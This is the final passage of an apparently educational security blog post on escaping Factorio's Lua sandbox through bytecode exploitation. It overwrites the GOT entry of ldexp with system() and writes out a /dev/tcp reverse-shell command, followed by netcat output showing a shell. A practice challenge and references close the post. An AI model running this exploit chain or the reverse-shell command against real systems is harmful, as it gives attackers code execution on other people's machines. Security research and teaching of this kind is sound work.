</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a3b0</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] LIBC: 0x&#34;</span> <span style="color:#f92672">..</span> string.format(<span style="color:#e6db74">&#34;%x&#34;</span>, libc_base))
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] system: 0x&#34;</span> <span style="color:#f92672">..</span> string.format(<span style="color:#e6db74">&#34;%x&#34;</span>, system))
</span></span></code></pre></div><p>After calculating the position of system, we can overwrite the GOT entry with it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Corrupting ldexp with system address</span>
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289ef00</span>, system)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] Corrupted ldexp addr&#34;</span>)
</span></span></code></pre></div><h2 id="3-executing-commands">3. Executing commands</h2>
<p>Now that we have a way to call system from Lua code, let&rsquo;s try to execute a command. We will execute <code>sh -c &quot;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9001 0&gt;&amp;1 &amp;&quot;</code> to obtain a remote shell.</p>
<p>We can store the command in a Lua string and then call ldexp with this address</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sh -c &#34;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9001 0&gt;&amp;1 &amp;&#34;&#39;</span>
</span></span><span style="display:flex;"><span>math.ldexp(<span style="color:#ae81ff">0</span>, addr_of(cmd) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>)
</span></span></code></pre></div><p>However, we never get a shell, <em>what is happening?</em> We attach gdb to the program and break on the call to system, by doing this, we notice the problem: <strong>Lua calls ldexp with a 32 bit parameter</strong>, breaking our address</p>
<pre tabindex="0"><code>*RDI      0x9400f870
*R12  0x7fff9400f870  &#39;sh -c &#34;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9001 0&gt;&amp;1 &amp;&#34;&#39;
</code></pre><p>Fortunately, we already have a workaround, <strong>writing the command in the same segment we used to store the fake string</strong>. As PIE is not enabled (which is basically ASLR for the main binary), binary addresses are small enough for this</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Write command sh -c &#34;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9001 0&gt;&amp;1 &amp;&#34;</span>
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c150</span>, <span style="color:#ae81ff">0x2d206873</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c154</span>, <span style="color:#ae81ff">0x73222063</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c158</span>, <span style="color:#ae81ff">0x692d2068</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c15C</span>, <span style="color:#ae81ff">0x20263e20</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c160</span>, <span style="color:#ae81ff">0x7665642f</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c164</span>, <span style="color:#ae81ff">0x7063742f</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c168</span>, <span style="color:#ae81ff">0x3732312f</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c16C</span>, <span style="color:#ae81ff">0x302e302e</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c170</span>, <span style="color:#ae81ff">0x392f312e</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c174</span>, <span style="color:#ae81ff">0x20313030</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c178</span>, <span style="color:#ae81ff">0x31263e30</span>)
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x289c17C</span>, <span style="color:#ae81ff">0x222620</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] Executing shell&#34;</span>)
</span></span><span style="display:flex;"><span>math.ldexp(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x289c150</span>) <span style="color:#75715e">-- This will call system(0x289c150)</span>
</span></span></code></pre></div><p>This time, our exploit works and we recieve a remote shell</p>
<pre tabindex="0"><code>[MemoryCorruption /]$ nc -lvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:55556.
sh-5.2$ whoami
whoami
victim
sh-5.2$ 
</code></pre><h2 id="your-turn">Your Turn</h2>
<p>After reading this post, I hope you gained a good understanding of how Lua bytecode works and how it can be leveraged.</p>
<p>As I think the best way to learn something is by practicing, I made a small challenge in which you have to escape from a Lua interpreter
and execute a Javascript function that is not callable by Lua code.</p>
<p>You can find it here: 
<a href="https://alcawasm.memorycorruption.net/" target="_blank" rel="noopener">Escape from Alcawasm</a>
. I hope you have fun!</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>
<a href="https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html" target="_blank" rel="noopener">https://lua-users.org/lists/lua-l/2009-03/msg00039.html</a>
 Wayback Machine copy of the forum thread where the reasons why the bytecode verifier was deprecated&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>
<a href="https://github.com/Rseding91/Factorio-Lua/blob/master/src/lundump.c#L72" target="_blank" rel="noopener">Factorio Lua</a>
 code of the bytecode verifier of Factorio&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>
<a href="https://www.lua.org/pil/2.3.html" target="_blank" rel="noopener">Programming In Lua: Numbers</a>
 Explaination of how Lua implements Numbers&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>
<a href="https://conference.hitb.org/hitbsecconf2019ams/materials/D1T1%20-%20SeasCoASA%20-%20Exploiting%20a%20Small%20Leak%20in%20a%20Great%20Ship%20-%20Kaiyi%20Xu%20&amp;%20Lily%20Tang.pdf" target="_blank" rel="noopener">Exploiting a Small Leak in a Great Ship</a>
 Talk about exploiting Lua bytecode on a Cisco ASA Router that explains common bytecode vulnerabilities&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>
<a href="https://en.wikipedia.org/wiki/Double-precision_floating-point_format" target="_blank" rel="noopener">Double-Precision floating-point format</a>
: <strong>Wikipedia</strong> entry about doubles, check the section: <em>Precision limitations on integer values</em>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>
<a href="https://www.gnu.org/software/libc/manual/html_node/Floating_002dPoint-Conversions.html" target="_blank" rel="noopener">Floating-Point Conversions</a>
 <strong>GNU Libc manual</strong> entry that explains the output of the  <code>%a</code> format string&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>
<a href="https://en.wikipedia.org/wiki/Offset_binary" target="_blank" rel="noopener">Biased Representation</a>
 <strong>Wikipedia</strong> entry about Biased Representation&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>
<a href="https://en.wikipedia.org/wiki/Normal_number_%28computing%29" target="_blank" rel="noopener">Normal Numbers</a>
 <strong>Wikipedia</strong> entry about Normal numbers. It contains a table with the smallest normal number representable in each variant of floating-point numbers&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>
<a href="https://www.lua.org/pil/6.1.html" target="_blank" rel="noopener">Programming in Lua: Closures</a>
 Explaination of how Lua Closures work&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>
<a href="https://www.lua.org/" target="_blank" rel="noopener">Offical Lua Page</a>
 official implementation of Lua that we used for testing our code&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>
<a href="https://daniel.haxx.se/projects/trio/" target="_blank" rel="noopener"> Trio - portable and extendable printf and string functions</a>
 library that seems to be used by Factorio to implement a portable <code>sprintf</code>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>
<a href="https://gist.github.com/corsix/6575486" target="_blank" rel="noopener">Exploiting Lua 5.1 on 32-bit Windows</a>
 Gist about exploiting Lua 5.1 on Windows&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>

    </div>

    <div class="prev-next">
        
    </div>

    <div id="ex-footnote">
        <div id="ex-popup-wrapper">
            <div id="ex-footer-close"><span data-feather='x'></span></div>
            <div id="ex-footer-content"></div>
        </div>
    </div>


    <script>
        function replaceWithYoutubeIframe(event, element) {
            event.preventDefault(); 
            var iframe_data = JSON.parse(element.getAttribute('data-iframe-data'));
            
            var iframe = document.createElement('iframe');
            iframe.src = iframe_data.src;
            iframe.referrerPolicy = 'no-referrer';
            iframe.loading = iframe_data.loading;
            iframe.style = iframe_data.style;
            iframe.title = iframe_data.title;
            iframe.allowFullscreen = iframe_data.allowFullscreen;

            element.parentNode.replaceChild(iframe, element);
        }

        window.addEventListener("load", function () {
            const popupWrapper = document.getElementById("ex-popup-wrapper");
        
            
            const popupContentWrapper = document.getElementById("ex-footer-content");
            const popupContent = popupContentWrapper.appendChild(document.createElement("div"));
            popupContent.id = "popup-content";
            const popupIndex = popupContentWrapper.insertBefore(document.createElement("div"), popupContent);
            popupIndex.id = "popup-index";
        
            
            document.getElementById("ex-footer-close").addEventListener("click", () => {
                popupWrapper.style.display = "none";
            });
            
            
            document.querySelectorAll(".footnote-ref").forEach(fnRef =>
                fnRef.addEventListener("click", event => {
                    event.preventDefault();
            
                    const index = fnRef.hash.substring(4);
                    popupIndex.innerText = index + ".";
            
                    const footnote = document.getElementById("fn:" + index).cloneNode(true);
                    
                    const backrefElement = footnote.querySelector(".footnote-backref");
                    backrefElement.parentNode.removeChild(backrefElement);
                    popupContent.innerHTML = footnote.innerHTML.trim();
                    popupWrapper.style.display = "grid";
                })
            );
        
            window.addEventListener("scroll", () => {
                popupWrapper.style.display = "none";
            });
        });  
    </script>
    
    
</div>

<aside class="post-toc">
    <nav id="toc">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#what-is-factorio">What is Factorio?</a>
      <ul>
        <li><a href="#how-is-lua-used-in-the-game">How is Lua used in the game?</a></li>
        <li><a href="#the-more-the-merrier">The more the merrier</a></li>
      </ul>
    </li>
    <li><a href="#going-deeper">Going Deeper</a>
      <ul>
        <li><a href="#general-exploitation-path">General Exploitation Path</a></li>
        <li><a href="#a-small-leak-will-sink-a-great-ship">A small leak will sink a great ship</a>
          <ul>
            <li><a href="#who-controls-the-bytecode-controls-the-future">Who controls the Bytecode controls the future</a></li>
          </ul>
        </li>
        <li><a href="#bytecode-verifier">Bytecode Verifier</a></li>
      </ul>
    </li>
    <li><a href="#building-blocks">Building Blocks</a>
      <ul>
        <li><a href="#leaking-addresses">Leaking Addresses</a>
          <ul>
            <li><a href="#introduction-to-tvalues">Introduction to TValues</a></li>
            <li><a href="#forloop">FORLOOP</a>
              <ul>
                <li><a href="#ieee-754-double-precision">IEEE 754 double-precision</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#confusing-upvalues">Confusing Upvalues</a>
          <ul>
            <li><a href="#what-are-upvalues">What are Upvalues?</a></li>
            <li><a href="#the-gift-that-keeps-on-giving">The Gift that Keeps on Giving</a>
              <ul>
                <li><a href="#closures-and-prototypes">Closures and Prototypes</a></li>
                <li><a href="#wait-is-all-tvalues">Wait, is all TValues?</a></li>
                <li><a href="#toctou-type-of-check--type-of-use">TOCTOU: Type of Check != Type of Use</a></li>
              </ul>
            </li>
            <li><a href="#creating-fake-objects">Creating Fake Objects</a>
              <ul>
                <li><a href="#1-fake-string">1. Fake String</a></li>
                <li><a href="#2-fake-array-of-tvalues">2. Fake Array of TValues</a></li>
                <li><a href="#3-fake-proto">3. Fake Proto</a></li>
                <li><a href="#4-fake-lclosure">4. Fake LClosure</a></li>
              </ul>
            </li>
            <li><a href="#the-tables-have-turned">The Tables Have Turned</a></li>
            <li><a href="#generic-primitives">Generic Primitives</a>
              <ul>
                <li><a href="#finishing-our-read-primitive">Finishing our read primitive</a></li>
                <li><a href="#building-a-write-what-where-primitive">Building a Write-What-Where Primitive</a></li>
                <li><a href="#controlling-the-instruction-pointer">Controlling the Instruction Pointer</a></li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#getting-remote-code-execution-on-linux">Getting Remote Code Execution on Linux</a>
      <ul>
        <li><a href="#0-integration-hell">0. Integration Hell?</a>
          <ul>
            <li><a href="#its-not-doubles-theres-no-way-its-doubles-it-was-doubles">Its not Doubles, Theres no way its Doubles, It was Doubles</a></li>
          </ul>
        </li>
        <li><a href="#1-function-to-replace-with-system">1. Function to replace with System</a></li>
        <li><a href="#2-replacing-the-address-of-ldexp-with-system">2. Replacing the Address of ldexp with system</a></li>
        <li><a href="#3-executing-commands">3. Executing commands</a></li>
        <li><a href="#your-turn">Your Turn</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    
    

    
    <span>&copy; 2024 Memory Corruption</span>
    
    <span>
        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
    </span>
</footer>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8ffc771b9e9acd60","version":"2024.10.5","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"e69be447ad3744b8b12cac160640f5b0","b":1}' crossorigin="anonymous"></script>
</body>
</html>
